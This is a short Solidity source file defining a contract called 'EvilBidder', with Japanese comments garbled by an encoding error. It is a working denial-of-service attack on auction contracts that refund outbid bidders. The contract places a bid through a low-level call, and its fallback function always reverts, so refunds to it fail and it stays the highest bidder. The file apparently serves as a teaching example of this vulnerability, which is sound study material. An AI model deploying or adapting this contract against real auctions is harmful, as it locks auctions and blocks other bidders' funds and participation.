pragma solidity ^0.4.11;
contract  EvilBidder {
	/// FallbackŠÖ”
	function() payable{
		revert();
	}
		
	/// bid—p‚ÌŠÖ”
	function bid(address _to) public payable {
		// bid‚ğs‚¤
		if(!_to.call.value(msg.value)(bytes4(sha3("bid()")))) {
			throw;
		} 
	}
}